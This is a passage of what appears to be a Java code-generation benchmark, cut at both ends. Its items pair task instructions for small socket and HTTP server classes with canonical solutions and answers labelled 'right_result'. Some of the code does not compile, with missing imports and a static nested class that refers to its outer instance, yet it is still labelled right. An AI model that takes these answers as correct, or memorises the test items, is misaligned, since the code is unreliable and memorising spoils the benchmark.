    "Canonical_solution": "import com.google.common.base.Preconditions;\nimport lombok.extern.slf4j.Slf4j;\nimport java.io.BufferedReader;\nimport java.io.BufferedWriter;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.io.OutputStreamWriter;\nimport java.net.ServerSocket;\nimport java.net.Socket;\n\n@Slf4j\npublic final class SnapshotService {\n\n    private final int port;\n    private ServerSocket serverSocket;\n    private volatile boolean closed;\n\n    public SnapshotService(final int port) {\n        Preconditions.checkArgument(port >= 0 && port <= 0xFFFF, \"Port value out of range: \" + port);\n        this.port = port;\n    }\n\n    public void listen() {\n        try {\n            log.info(\"ElasticJob: Snapshot service is running on port '{}'\", openSocket(port));\n        } catch (final IOException ex) {\n            log.error(\"ElasticJob: Snapshot service listen failure, error is: \", ex);\n        }\n    }\n\n    private int openSocket(final int port) throws IOException {\n        closed = false;\n        serverSocket = new ServerSocket(port);\n        int localPort = serverSocket.getLocalPort();\n        String threadName = String.format(\"elasticjob-snapshot-service-%d\", localPort);\n        new Thread(() -> {\n            while (!closed) {\n                try {\n                    process(serverSocket.accept());\n                } catch (final IOException ex) {\n                    if (isIgnoredException()) {\n                        return;\n                    }\n                    log.error(\"ElasticJob: Snapshot service open socket failure, error is: \", ex);\n                }\n            }\n        }, threadName).start();\n        return localPort;\n    }\n\n    private boolean isIgnoredException() {\n        return serverSocket.isClosed();\n    }\n\n    private void process(final Socket socket) throws IOException {\n        try (\n                BufferedReader reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n                BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(socket.getOutputStream()));\n                Socket ignored = socket) {\n            String cmdLine = reader.readLine();\n            if (null != cmdLine) {\n                outputMessage(writer, \"Processed: \" + cmdLine);\n            }\n        }\n    }\n\n    private void outputMessage(final BufferedWriter outputWriter, final String msg) throws IOException {\n        outputWriter.append(msg);\n        outputWriter.flush();\n    }\n\n    public void close() {\n        closed = true;\n        if (null != serverSocket && !serverSocket.isClosed()) {\n            try {\n                serverSocket.close();\n            } catch (final IOException ex) {\n                log.error(\"ElasticJob: Snapshot service close failure, error is: \", ex);\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "right_result": "```java\nimport java.io.*;\nimport java.net.*;\n\npublic class SnapshotService {\n    private int port;\n    private ServerSocket serverSocket;\n    private volatile boolean closed = false;\n\n    public SnapshotService(int port) throws IOException {\n        if (port <= 0 || port > 65535) {\n            throw new IllegalArgumentException(\"Invalid port number\");\n        }\n        this.port = port;\n    }\n\n    public void listen() throws IOException {\n        serverSocket = new ServerSocket(port);\n        Thread serverThread = new Thread(() -> {\n            try {\n                while (!closed) {\n                    Socket socket = serverSocket.accept();\n                    process(socket);\n                }\n            } catch (IOException e) {\n                if (!isIgnoredException()) {\n                    e.printStackTrace();\n                }\n            } finally {\n                close();\n            }\n        });\n        serverThread.start();\n    }\n\n    private int openSocket(int port) throws IOException {\n        return serverSocket.getLocalPort();\n    }\n\n    private boolean isIgnoredException() {\n        return closed && !serverSocket.isClosed();\n    }\n\n    private void process(Socket socket) {\n        try (\n            BufferedReader reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n            BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(socket.getOutputStream()))\n        ) {\n            String command;\n            while ((command = reader.readLine()) != null) {\n                String response = \"Processed: \" + command;\n                outputMessage(writer, response);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        } finally {\n            try {\n                socket.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private void outputMessage(BufferedWriter outputWriter, String msg) throws IOException {\n        outputWriter.write(msg);\n        outputWriter.newLine();\n        outputWriter.flush();\n    }\n\n    public synchronized void close() {\n        closed = true;\n        try {\n            if (serverSocket != null && !serverSocket.isClosed()) {\n                serverSocket.close();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 548,
    "Instruction": "Task Description: Create a Java class that implements a TCP server for binary data communication, capable of handling client connections and data exchange using object serialization.\n\nClass Description: BinaryLinkServer is a TCP server implementation that listens for incoming client connections, establishes communication channels, and handles binary data exchange using Java's object serialization. It manages connection lifecycle and provides thread-safe termination.\n\nAttributes:\n- acceptor: Acceptor - Thread responsible for accepting incoming client connections\n- handler: AtomicReference<Handler> - Thread-safe reference to the current connection handler\n\nMethods:\n- BinaryLinkServer() -> void - Constructor that initializes the server and starts the acceptor thread\n- terminate() -> void - Shuts down the server by closing all active connections and stopping threads\n- getListenAddress() -> InetAddress - Determines the server's listening address from system properties or defaults to loopback\n- getListenPort() -> int - Retrieves the server's listening port from system properties or uses ephemeral port\n\nNested Classes:\n1. Acceptor (extends Thread):\n   Attributes:\n   - server: ServerSocket - The server socket listening for connections\n   - listenAddress: InetAddress - The address the server is bound to\n\n   Methods:\n   - Acceptor() -> void - Constructor that creates the server socket\n   - run() -> void - Main acceptor loop that handles incoming connections\n   - close() -> void - Closes the server socket\n\n2. Handler (extends Thread):\n   Attributes:\n   - socket: Socket - The client connection socket\n   - is: InputStream - Input stream from the client\n   - os: OutputStream - Output stream to the client\n   - ois: ObjectInputStream - Object input stream for deserialization\n   - oos: ObjectOutputStream - Object output stream for serialization\n\n   Methods:\n   - Handler(Socket) -> void - Constructor that initializes communication streams\n   - run() -> void - Main handler loop that processes incoming objects\n   - close() -> void - Closes the client connection and releases resources",
    "Canonical_solution": "import java.io.BufferedInputStream;\nimport java.io.BufferedOutputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.ObjectInputStream;\nimport java.io.ObjectOutputStream;\nimport java.io.OutputStream;\nimport java.net.InetAddress;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.net.SocketException;\nimport java.net.UnknownHostException;\nimport java.util.concurrent.atomic.AtomicReference;\n\npublic final class BinaryLinkServer {\n\n    private final Acceptor acceptor;\n    private final AtomicReference<Handler> handler;\n\n    public BinaryLinkServer() throws IOException {\n        acceptor = new Acceptor();\n        acceptor.start();\n        handler = new AtomicReference<>();\n    }\n\n    public void terminate() {\n        acceptor.close();\n        Handler h = handler.getAndSet(null);\n        if (h != null) {\n            h.close();\n        }\n        try {\n            acceptor.join();\n            if (h != null) {\n                h.join();\n            }\n        } catch (InterruptedException e) {\n            // ignore\n        }\n    }\n\n    private InetAddress getListenAddress() throws UnknownHostException {\n        String addr = System.getProperty(\"jmh.link.address\");\n        if (addr != null) {\n            return InetAddress.getByName(addr);\n        }\n        try {\n            Method m = InetAddress.class.getMethod(\"getLoopbackAddress\");\n            return (InetAddress) m.invoke(null);\n        } catch (Exception e) {\n            // fall through\n        }\n        return InetAddress.getByAddress(new byte[] {127, 0, 0, 1});\n    }\n\n    private int getListenPort() {\n        return Integer.getInteger(\"jmh.link.port\", 0);\n    }\n\n    private final class Acceptor extends Thread {\n        private final ServerSocket server;\n        private final InetAddress listenAddress;\n\n        public Acceptor() throws IOException {\n            listenAddress = getListenAddress();\n            server = new ServerSocket(getListenPort(), 50, listenAddress);\n        }\n\n        @Override\n        public void run() {\n            try {\n                while (!Thread.interrupted()) {\n                    Socket clientSocket = server.accept();\n                    Handler r = new Handler(clientSocket);\n                    if (!handler.compareAndSet(null, r)) {\n                        throw new IllegalStateException(\"Handler already registered\");\n                    }\n                    r.start();\n                }\n            } catch (SocketException e) {\n                // assume \"Socket closed\"\n            } catch (IOException e) {\n                throw new IllegalStateException(e);\n            } finally {\n                close();\n            }\n        }\n\n        public void close() {\n            try {\n                server.close();\n            } catch (IOException e) {\n                // ignore\n            }\n        }\n    }\n\n    private final class Handler extends Thread {\n        private final Socket socket;\n        private final InputStream is;\n        private final OutputStream os;\n        private ObjectInputStream ois;\n        private ObjectOutputStream oos;\n\n        public Handler(Socket socket) throws IOException {\n            this.socket = socket;\n            this.is = socket.getInputStream();\n            this.os = socket.getOutputStream();\n            this.oos = new ObjectOutputStream(new BufferedOutputStream(os));\n            oos.flush();\n        }\n\n        @Override\n        public void run() {\n            try {\n                ois = new ObjectInputStream(new BufferedInputStream(is));\n                while (true) {\n                    Object obj = ois.readObject();\n                    if (obj == null) break;\n                    // Handle different frame types here\n                }\n            } catch (Exception e) {\n                // Handle exceptions\n            } finally {\n                close();\n            }\n        }\n\n        public void close() {\n            try {\n                socket.close();\n            } catch (IOException e) {\n                // ignore\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "right_result": "```java\nimport java.io.*;\nimport java.net.*;\nimport java.util.concurrent.atomic.*;\n\npublic class BinaryLinkServer {\n    private Acceptor acceptor;\n    private AtomicReference<Handler> handler = new AtomicReference<>();\n\n    public BinaryLinkServer() {\n        try {\n            InetAddress listenAddress = getListenAddress();\n            int listenPort = getListenPort();\n            acceptor = new Acceptor(listenAddress, listenPort);\n            acceptor.start();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void terminate() {\n        if (acceptor != null) {\n            acceptor.close();\n        }\n        Handler h = handler.getAndSet(null);\n        if (h != null) {\n            h.close();\n        }\n    }\n\n    public InetAddress getListenAddress() throws UnknownHostException {\n        String addressStr = System.getProperty(\"binarylink.server.address\", \"127.0.0.1\");\n        return InetAddress.getByName(addressStr);\n    }\n\n    public int getListenPort() {\n        return Integer.parseInt(System.getProperty(\"binarylink.server.port\", \"0\"));\n    }\n\n    private static class Acceptor extends Thread {\n        private ServerSocket server;\n        private InetAddress listenAddress;\n\n        public Acceptor(InetAddress listenAddress, int listenPort) throws IOException {\n            this.listenAddress = listenAddress;\n            server = new ServerSocket(listenPort, 50, listenAddress);\n        }\n\n        @Override\n        public void run() {\n            while (!Thread.currentThread().isInterrupted()) {\n                try (Socket socket = server.accept()) {\n                    BinaryLinkServer.this.handler.set(new Handler(socket));\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n\n        public void close() {\n            try {\n                server.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private static class Handler extends Thread {\n        private Socket socket;\n        private InputStream is;\n        private OutputStream os;\n        private ObjectInputStream ois;\n        private ObjectOutputStream oos;\n\n        public Handler(Socket socket) {\n            this.socket = socket;\n            try {\n                is = socket.getInputStream();\n                os = socket.getOutputStream();\n                ois = new ObjectInputStream(is);\n                oos = new ObjectOutputStream(os);\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n\n        @Override\n        public void run() {\n            try {\n                while (true) {\n                    Object obj = ois.readObject();\n                    // Process the object\n                    oos.writeObject(obj);\n                }\n            } catch (IOException | ClassNotFoundException e) {\n                e.printStackTrace();\n            } finally {\n                close();\n            }\n        }\n\n        public void close() {\n            try {\n                if (ois != null) ois.close();\n                if (oos != null) oos.close();\n                if (is != null) is.close();\n                if (os != null) os.close();\n                if (socket != null) socket.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 55,
    "Instruction": "Task Description: Create a Java utility class for handling HTTP requests and responses, including POST operations, with support for proxies, timeouts, and error handling.\n\nClass Description: JavaHttpUtility is a helper class designed to simplify HTTP communication in Java applications. It provides methods for making POST requests, handling responses, and managing errors. The class supports proxy configuration, connection timeouts, and compressed responses (gzip).\n\nAttributes:\nCONNECT_TIMEOUT: [int] - Connection timeout in milliseconds (default: 10000)\nREAD_TIMEOUT: [int] - Read timeout in milliseconds (default: 10000)\n\nMethods:\ngetProxy: () -> [Proxy] - Retrieves system proxy settings if configured\ndoPost: (String urlAddress, Map<String, String> param) -> [String] - Executes a POST request to the specified URL with given parameters\nhandleResponse: (HttpURLConnection httpURLConnection) -> [String] - Processes the HTTP response and handles errors\nreadResult: (HttpURLConnection urlConnection) -> [String] - Reads and returns the successful response body\nhandleError: (HttpURLConnection urlConnection) -> [String] - Processes and throws appropriate exceptions for error responses",
    "Canonical_solution": "import org.json.JSONException;\nimport org.json.JSONObject;\nimport org.qii.weiciyuan.support.debug.AppLogger;\nimport org.qii.weiciyuan.support.error.ErrorCode;\nimport org.qii.weiciyuan.support.error.WeiboException;\nimport org.qii.weiciyuan.support.utils.Utility;\n\nimport java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.io.InterruptedIOException;\nimport java.io.UnsupportedEncodingException;\nimport java.net.HttpURLConnection;\nimport java.net.InetSocketAddress;\nimport java.net.Proxy;\nimport java.net.URL;\nimport java.util.Map;\nimport java.util.zip.GZIPInputStream;\n\nimport javax.net.ssl.HttpsURLConnection;\n\npublic class JavaHttpUtility {\n\n    private static final int CONNECT_TIMEOUT = 10 * 1000;\n    private static final int READ_TIMEOUT = 10 * 1000;\n\n    private static Proxy getProxy() {\n        String proxyHost = System.getProperty(\"http.proxyHost\");\n        String proxyPort = System.getProperty(\"http.proxyPort\");\n        if (!TextUtils.isEmpty(proxyHost) && !TextUtils.isEmpty(proxyPort)) {\n            return new Proxy(java.net.Proxy.Type.HTTP,\n                    new InetSocketAddress(proxyHost, Integer.valueOf(proxyPort)));\n        } else {\n            return null;\n        }\n    }\n\n    public String doPost(String urlAddress, Map<String, String> param) throws WeiboException {\n        try {\n            URL url = new URL(urlAddress);\n            Proxy proxy = getProxy();\n            HttpsURLConnection uRLConnection;\n            if (proxy != null) {\n                uRLConnection = (HttpsURLConnection) url.openConnection(proxy);\n            } else {\n                uRLConnection = (HttpsURLConnection) url.openConnection();\n            }\n\n            uRLConnection.setDoInput(true);\n            uRLConnection.setDoOutput(true);\n            uRLConnection.setRequestMethod(\"POST\");\n            uRLConnection.setUseCaches(false);\n            uRLConnection.setConnectTimeout(CONNECT_TIMEOUT);\n            uRLConnection.setReadTimeout(READ_TIMEOUT);\n            uRLConnection.setInstanceFollowRedirects(false);\n            uRLConnection.setRequestProperty(\"Connection\", \"Keep-Alive\");\n            uRLConnection.setRequestProperty(\"Charset\", \"UTF-8\");\n            uRLConnection.setRequestProperty(\"Accept-Encoding\", \"gzip, deflate\");\n            uRLConnection.connect();\n\n            DataOutputStream out = new DataOutputStream(uRLConnection.getOutputStream());\n            out.write(Utility.encodeUrl(param).getBytes());\n            out.flush();\n            out.close();\n            return handleResponse(uRLConnection);\n        } catch (IOException e) {\n            throw new WeiboException(\"Timeout\", e);\n        }\n    }\n\n    private String handleResponse(HttpURLConnection httpURLConnection) throws WeiboException {\n        int status = 0;\n        try {\n            status = httpURLConnection.getResponseCode();\n        } catch (IOException e) {\n            httpURLConnection.disconnect();\n            throw new WeiboException(\"Timeout\", e);\n        }\n\n        if (status != HttpURLConnection.HTTP_OK) {\n            return handleError(httpURLConnection);\n        }\n\n        return readResult(httpURLConnection);\n    }\n\n    private String readResult(HttpURLConnection urlConnection) throws WeiboException {\n        InputStream is = null;\n        BufferedReader buffer = null;\n        try {\n            is = urlConnection.getInputStream();\n\n            String content_encode = urlConnection.getContentEncoding();\n            if (!TextUtils.isEmpty(content_encode) && content_encode.equals(\"gzip\")) {\n                is = new GZIPInputStream(is);\n            }\n\n            buffer = new BufferedReader(new InputStreamReader(is));\n            StringBuilder strBuilder = new StringBuilder();\n            String line;\n            while ((line = buffer.readLine()) != null) {\n                strBuilder.append(line);\n            }\n            return strBuilder.toString();\n        } catch (IOException e) {\n            throw new WeiboException(\"Timeout\", e);\n        } finally {\n            Utility.closeSilently(is);\n            Utility.closeSilently(buffer);\n            urlConnection.disconnect();\n        }\n    }\n\n    private String handleError(HttpURLConnection urlConnection) throws WeiboException {\n        InputStream is = null;\n        BufferedReader buffer = null;\n        try {\n            is = urlConnection.getErrorStream();\n            if (is == null) {\n                throw new WeiboException(\"Unknown network error\");\n            }\n\n            String content_encode = urlConnection.getContentEncoding();\n            if (!TextUtils.isEmpty(content_encode) && content_encode.equals(\"gzip\")) {\n                is = new GZIPInputStream(is);\n            }\n\n            buffer = new BufferedReader(new InputStreamReader(is));\n            StringBuilder strBuilder = new StringBuilder();\n            String line;\n            while ((line = buffer.readLine()) != null) {\n                strBuilder.append(line);\n            }\n            AppLogger.d(\"error result=\" + strBuilder.toString());\n            \n            JSONObject json = new JSONObject(strBuilder.toString());\n            String err = json.optString(\"error_description\", \"\");\n            if (TextUtils.isEmpty(err)) {\n                err = json.getString(\"error\");\n            }\n            int errCode = json.getInt(\"error_code\");\n            WeiboException exception = new WeiboException();\n            exception.setError_code(errCode);\n            exception.setOriError(err);\n\n            if (errCode == ErrorCode.EXPIRED_TOKEN || errCode == ErrorCode.INVALID_TOKEN) {\n                Utility.showExpiredTokenDialogOrNotification();\n            }\n\n            throw exception;\n        } catch (IOException | JSONException e) {\n            throw new WeiboException(\"Timeout\", e);\n        } finally {\n            Utility.closeSilently(is);\n            Utility.closeSilently(buffer);\n            urlConnection.disconnect();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "right_result": "```java\nimport java.io.BufferedReader;\nimport java.io.DataOutputStream;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.InetSocketAddress;\nimport java.net.Proxy;\nimport java.net.URL;\nimport java.util.Map;\n\npublic class JavaHttpUtility {\n    private static final int CONNECT_TIMEOUT = 10000;\n    private static final int READ_TIMEOUT = 10000;\n\n    public Proxy getProxy() {\n        return Proxy.NO_PROXY; // Placeholder for actual proxy retrieval logic\n    }\n\n    public String doPost(String urlAddress, Map<String, String> param) {\n        HttpURLConnection httpURLConnection = null;\n        try {\n            URL url = new URL(urlAddress);\n            httpURLConnection = (HttpURLConnection) url.openConnection(getProxy());\n            httpURLConnection.setRequestMethod(\"POST\");\n            httpURLConnection.setConnectTimeout(CONNECT_TIMEOUT);\n            httpURLConnection.setReadTimeout(READ_TIMEOUT);\n            httpURLConnection.setDoOutput(true);\n\n            StringBuilder postData = new StringBuilder();\n            for (Map.Entry<String, String> entry : param.entrySet()) {\n                if (postData.length() != 0) postData.append('&');\n                postData.append(entry.getKey()).append('=').append(entry.getValue());\n            }\n            byte[] postDataBytes = postData.toString().getBytes(\"UTF-8\");\n\n            DataOutputStream wr = new DataOutputStream(httpURLConnection.getOutputStream());\n            wr.write(postDataBytes);\n            wr.flush();\n            wr.close();\n\n            return handleResponse(httpURLConnection);\n        } catch (IOException e) {\n            handleError(httpURLConnection);\n            return null;\n        } finally {\n            if (httpURLConnection != null) httpURLConnection.disconnect();\n        }\n    }\n\n    private String handleResponse(HttpURLConnection httpURLConnection) throws IOException {\n        if (httpURLConnection.getResponseCode() == HttpURLConnection.HTTP_OK) {\n            return readResult(httpURLConnection);\n        } else {\n            handleError(httpURLConnection);\n            return null;\n        }\n    }\n\n    private String readResult(HttpURLConnection urlConnection) throws IOException {\n        BufferedReader in = new BufferedReader(new InputStreamReader(urlConnection.getInputStream()));\n        String inputLine;\n        StringBuilder content = new StringBuilder();\n        while ((inputLine = in.readLine()) != null) {\n            content.append(inputLine);\n        }\n        in.close();\n        return content.toString();\n    }\n\n    private void handleError(HttpURLConnection urlConnection) throws IOException {\n        BufferedReader in = new BufferedReader(new InputStreamReader(urlConnection.getErrorStream()));\n        String inputLine;\n        StringBuilder content = new StringBuilder();\n        while ((inputLine = in.readLine()) != null) {\n            content.append(inputLine);\n        }\n        in.close();\n        throw new IOException(\"HTTP Error Code: \" + urlConnection.getResponseCode() + \", Error Message: \" + content.toString());\n    }\n}\n```"
  },
  {
    "Task_id": 550,
    "Instruction": "Task Description: Implement a simple embedded HTTP server class that can handle incoming HTTP requests, parse request information, and provide a framework for custom request handling.\n\nClass Description: The EmbedHttpServer class represents a basic HTTP server that listens on a specified port, accepts client connections, parses HTTP request headers and content, and provides hooks for custom request processing. It handles the low-level socket communication while delegating the actual request handling to subclasses or implementations.\n\nAttributes:\n- port: int - The port number on which the server will listen for incoming connections\n- serverSocket: ServerSocket - The server socket instance used to accept client connections\n\nMethods:\n- EmbedHttpServer(int port) -> None - Constructor that initializes the server with the specified port\n- start() -> void - Starts the server by creating a ServerSocket and launching a dedicated thread for handling connections\n- stop() -> void - Stops the server by closing the ServerSocket and cleaning up resources\n- run() -> void - The main server loop that accepts connections and processes requests (runs in a separate thread)\n- handle(String method, String path, HashMap<String,String> headers, Map<String,String> queries, InputStream input, OutputStream response) -> void - Abstract method meant to be overridden for custom request handling (does nothing in base implementation)\n- parsePath(String path) -> Map<String,String> - Helper method that parses the request path and extracts query parameters",
    "Canonical_solution": "import android.text.TextUtils;\nimport com.antfortune.freeline.router.ISchemaAction;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class EmbedHttpServer {\n\n    private int port;\n    private ServerSocket serverSocket;\n\n    public EmbedHttpServer(int port) {\n        this.port = port;\n    }\n\n    public void start() throws IOException {\n        if (serverSocket == null) {\n            serverSocket = new ServerSocket(port);\n            new Thread(this::run, \"embed-http-server\").start();\n        }\n    }\n\n    public void stop() throws IOException {\n        if (serverSocket != null) {\n            serverSocket.close();\n            serverSocket = null;\n        }\n    }\n\n    private void run() {\n        final ServerSocket ss = serverSocket;\n        while (ss == serverSocket) {\n            Socket conn = null;\n            try {\n                conn = ss.accept();\n                String method = null;\n                String path = null;\n                HashMap<String, String> headers = new HashMap<>();\n\n                InputStream ins = conn.getInputStream();\n                StringBuilder sb = new StringBuilder(512);\n                int l;\n                while ((l = ins.read()) != -1) {\n                    if (l == '\\n') {\n                        if (sb.length() > 0 && sb.charAt(sb.length() - 1) == '\\r')\n                            sb.setLength(sb.length() - 1);\n                        if (sb.length() == 0) {\n                            break;\n                        } else if (method == null) {\n                            int i = sb.indexOf(\" \");\n                            method = sb.substring(0, i);\n                            int j = sb.lastIndexOf(\" HTTP/\");\n                            path = sb.substring(i + 1, j).trim();\n                        } else {\n                            int i = sb.indexOf(\":\");\n                            String name = sb.substring(0, i).trim();\n                            String val = sb.substring(i + 1).trim();\n                            headers.put(name, val);\n                        }\n                        sb.setLength(0);\n                    } else {\n                        sb.append((char) l);\n                    }\n                }\n                int contentLength = 0;\n                String str = headers.get(\"Content-Length\");\n                if (str != null) {\n                    contentLength = Integer.parseInt(str);\n                }\n                OutputStream os = conn.getOutputStream();\n                str = headers.get(\"Expect\");\n                if (\"100-Continue\".equalsIgnoreCase(str)) {\n                    os.write(\"HTTP/1.1 100 Continue\\r\\n\\r\\n\".getBytes(\"ASCII\"));\n                    os.flush();\n                }\n                InputStream input = new BodyInputStream(ins, contentLength);\n                OutputStream response = new ResponseOutputStream(os);\n\n                Map<String, String> queries = parsePath(path);\n                handle(method, path, headers, queries, input, response);\n                response.close();\n\n                conn.close();\n            } catch (Exception e) {\n                if (conn != null) {\n                    try {\n                        conn.close();\n                    } catch (Exception ee) {}\n                }\n            }\n\n            if (!ss.isBound() || ss.isClosed()) {\n                serverSocket = null;\n            }\n        }\n    }\n\n    protected void handle(String method, String path,\n                         HashMap<String, String> headers, Map<String, String> queries, InputStream input,\n                         OutputStream response) throws Exception {\n    }\n\n    private static Map<String, String> parsePath(String path) {\n        if (TextUtils.isEmpty(path)) {\n            return null;\n        }\n        int descriptionIndex = path.indexOf(\"/\");\n        if (descriptionIndex == -1) {\n            return null;\n        }\n        String description = path.substring(descriptionIndex + 1);\n        Map<String, String> queries = new HashMap<>();\n        int queryIndex = description.indexOf(\"?\");\n        if (queryIndex == -1) {\n            queries.put(ISchemaAction.DESCRIPTION, description);\n        } else {\n            queries.put(ISchemaAction.DESCRIPTION, description.substring(0, queryIndex));\n            description = description.substring(queryIndex + 1);\n        }\n        String[] arr = description.split(\"&\");\n        for (String segment : arr) {\n            String[] query = segment.split(\"=\");\n            if (query.length == 2) {\n                queries.put(query[0], query[1]);\n            } else if (query.length == 1) {\n                queries.put(query[0], \"\");\n            }\n        }\n        return queries;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "right_result": "```java\nimport java.io.*;\nimport java.net.*;\nimport java.util.*;\n\nabstract class EmbedHttpServer {\n    private int port;\n    private ServerSocket serverSocket;\n\n    public EmbedHttpServer(int port) {\n        this.port = port;\n    }\n\n    public void start() {\n        try {\n            serverSocket = new ServerSocket(port);\n            Thread serverThread = new Thread(this::run);\n            serverThread.start();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void stop() {\n        try {\n            if (serverSocket != null && !serverSocket.isClosed()) {\n                serverSocket.close();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private void run() {\n        try {\n            while (!serverSocket.isClosed()) {\n                Socket clientSocket = serverSocket.accept();\n                handleClientRequest(clientSocket);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private void handleClientRequest(Socket clientSocket) {\n        try (\n            BufferedReader reader = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));\n            PrintWriter writer = new PrintWriter(clientSocket.getOutputStream(), true)\n        ) {\n            StringBuilder request = new StringBuilder();\n            String line;\n            while ((line = reader.readLine()) != null && !line.isEmpty()) {\n                request.append(line).append(\"\\r\\n\");\n            }\n            String[] parts = request.toString().split(\"\\r\\n\\r\\n\", 2);\n            String headerPart = parts[0];\n            String bodyPart = parts.length > 1 ? parts[1] : \"\";\n\n            String[] firstLine = headerPart.split(\" \", 3);\n            String method = firstLine[0];\n            String path = firstLine[1];\n            String version = firstLine[2];\n\n            Map<String, String> headers = parseHeaders(headerPart);\n            Map<String, String> queries = parseQuery(path);\n\n            handle(method, path, headers, queries, new ByteArrayInputStream(bodyPart.getBytes()), writer);\n        } catch (IOException e) {\n            e.printStackTrace();\n        } finally {\n            try {\n                clientSocket.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    protected abstract void handle(String method, String path, Map<String, String> headers, Map<String, String> queries, InputStream input, OutputStream response);\n\n    protected Map<String, String> parseHeaders(String headerPart) {\n        Map<String, String> headers = new HashMap<>();\n        String[] lines = headerPart.split(\"\\r\\n\");\n        for (int i = 1; i < lines.length; i++) {\n            String[] pair = lines[i].split(\": \", 2);\n            if (pair.length == 2) {\n                headers.put(pair[0], pair[1]);\n            }\n        }\n        return headers;\n    }\n\n    protected Map<String, String> parseQuery(String path) {\n        Map<String, String> queries = new HashMap<>();\n        int queryIndex = path.indexOf('?');\n        if (queryIndex != -1) {\n            String query = path.substring(queryIndex + 1);\n            String[] pairs = query.split(\"&\");\n            for (String pair : pairs) {\n                String[] keyValue = pair.split(\"=\", 2);\n                if (keyValue.length == 2) {\n                    queries.put(keyValue[0], keyValue[1]);\n                }\n            }\n        }\n        return queries;\n    }\n}\n```"
  },
  {
    "Task_id": 553,
    "Instruction": "Task Description: Create a TCP server class that listens for incoming client connections, handles each client connection in a separate thread, and processes incoming data from clients.\n\nClass Description: TCPServer is a Java class that implements a basic TCP server using ServerSocket. It listens on a specified port for incoming client connections, creates a new thread for each connected client, and reads UTF-encoded messages from clients. The server maintains a running state and properly closes resources when finished.\n\nAttributes:\n- serverSocket: ServerSocket - The server socket that listens for incoming connections\n- started: boolean - Flag indicating whether the server is running\n\nMethods:\n- start(int port) -> void - Starts the server on the specified port, begins listening for connections, and creates new threads for each client\n- ClientHandler(Socket socket) -> void - Constructor for the inner client handler class (takes a client socket as parameter)\n- run() -> void - The thread's main execution method that reads data from the client (inherited from Thread)",
    "Canonical_solution": "import java.io.DataInputStream;\nimport java.io.IOException;\nimport java.net.ServerSocket;\nimport java.net.Socket;\n\npublic class TCPServer {\n    private ServerSocket serverSocket;\n    private boolean started;\n\n    public void start(int port) throws IOException {\n        serverSocket = new ServerSocket(port);\n        started = true;\n        System.out.println(\"Server started\");\n\n        try {\n            while (started) {\n                Socket clientSocket = serverSocket.accept();\n                System.out.println(\"A client connected!\");\n                new ClientHandler(clientSocket).start();\n            }\n        } finally {\n            if (serverSocket != null) {\n                serverSocket.close();\n            }\n        }\n    }\n\n    private class ClientHandler extends Thread {\n        private Socket socket;\n        private DataInputStream inputStream;\n\n        public ClientHandler(Socket socket) throws IOException {\n            this.socket = socket;\n            this.inputStream = new DataInputStream(socket.getInputStream());\n        }\n\n        @Override\n        public void run() {\n            try {\n                System.out.println(inputStream.readUTF());\n            } catch (IOException e) {\n                e.printStackTrace();\n            } finally {\n                try {\n                    if (inputStream != null) {\n                        inputStream.close();\n                    }\n                    if (socket != null) {\n                        socket.close();\n                    }\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "right_result": "```java\nimport java.io.*;\nimport java.net.*;\n\npublic class TCPServer {\n    private ServerSocket serverSocket;\n    private boolean started;\n\n    public TCPServer() {\n        this.serverSocket = null;\n        this.started = false;\n    }\n\n    public void start(int port) throws IOException {\n        if (started) throw new IllegalStateException(\"Server already started\");\n        serverSocket = new ServerSocket(port);\n        started = true;\n        System.out.println(\"Server started on port \" + port);\n        while (started) {\n            Socket clientSocket = serverSocket.accept();\n            new Thread(new ClientHandler(clientSocket)).start();\n        }\n    }\n\n    private static class ClientHandler implements Runnable {\n        private Socket socket;\n        private BufferedReader reader;\n\n        public ClientHandler(Socket socket) {\n            this.socket = socket;\n            try {\n                reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n\n        @Override\n        public void run() {\n            String line;\n            try {\n                while ((line = reader.readLine()) != null) {\n                    System.out.println(\"Received from client: \" + line);\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            } finally {\n                try {\n                    socket.close();\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n    }\n\n    public void stop() {\n        started = false;\n        try {\n            if (serverSocket != null) 